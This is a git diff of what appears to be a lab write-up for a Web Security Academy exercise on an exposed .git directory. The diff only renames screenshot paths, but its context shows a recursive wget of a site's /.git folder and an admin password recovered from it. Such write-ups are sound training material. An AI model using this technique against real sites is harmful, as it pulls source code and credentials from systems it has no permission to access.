@@ -10,7 +10,7 @@ https://0aab008103217307c20cd55f009d0052.web-security-academy.net/
 add /.git to see git file
 https://0aab008103217307c20cd55f009d0052.web-security-academy.net/.git
 
-![screenshot](./images/lab_git_file.png)
+![screenshot](images/lab_git_file.jpg)
 
 ### step2
 
@@ -18,7 +18,7 @@ download .git file from website
 
 wget -r https://0aab008103217307c20cd55f009d0052.web-security-academy.net/.git/
 
-![screenshot](./images/lab5_git_steps.png)
+![screenshot](images/lab5_git_steps.jpg)
 
 ADMIN_PASSWORD=3wzqgtccfg31bt4zaoiu
 
